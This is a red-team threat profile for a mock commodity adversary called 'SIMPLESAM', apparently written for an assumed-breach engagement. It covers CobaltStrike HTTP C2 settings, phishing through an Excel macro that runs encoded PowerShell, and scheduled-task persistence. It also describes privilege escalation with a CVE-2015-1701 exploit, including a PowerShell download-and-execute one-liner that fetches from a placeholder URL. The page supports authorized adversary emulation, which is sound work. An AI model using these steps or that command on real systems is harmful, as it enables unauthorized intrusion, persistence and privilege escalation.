---
title: "Threat Profile: SIMPLESAM"
description: >
  SIMPLESAM threat profile example
---

# Threat Profile (SIMPLESAM)

:::tip
A modified version of this profile was used on an assumed breach engagement. This profile is provide as an example to show details that supported a real engagement. 
:::

## Description

C2 threat modeled after basic HTTP C2 using powershell and phishing as primary entry point. This profile represents commodity malware that doesn't focus on advanced techniques.

## Characteristics

 - C2 Backend: CobaltStrike
 - Port(s): 80
 - C2 Communication using HTTP Traffic
 - Executes as powershell encoded command
 - IP communication using IP addresses
 - Persistence: Scheduled Task

HTTP Request Profile

 - UserAgent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/6.0)"
 - GET: /s/ref=nb_sb_nos_2/143-3245
 - POST /S2854/auth/aws-hb

## System Modifications

### Files

 - None

### Registry

 - Schedule Task executed at user logon
 - Task Name: Updater

### WMI

 - None

-----------------------------------------------------

## Deployment Steps

Phishing Payload

 - Modify an excel document payload with a macros that launches a powershell encoded payload 

Powershell Payload

 - Create CobaltStrike C2 Profile
 - Build payloads using profile
 - Powershell Payload
 - Create Scheduled Task script with file and path to payload
   - Update persistence script with powershell payload
   - line 78 : Update encoded Powershell payload here
   - line 154: Update Domain name here

## Persistence Steps (via CobaltStrike Beacon Console)

  ```PowerShell
  powershell-import /data/PAYLOADS/Invoke-Persistence.ps1
  powershell Invoke-Persistence -Name Updater -CreatePersistence -ScheduledTask
  ```

## Privilege Escalation (based on CVE-2015-1701)

Compile exploit and name ghost.exe

>Reference: https://www.exploit-db.com/exploits/37049/

 - 32 Bit Binary: ghost.exe
 - Usage: 

```
ghost.exe powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://< TARGETURL >'))"
```

Powershell uses download and execute via encoded command

Encoded command starts a new beacon as SYSTEM



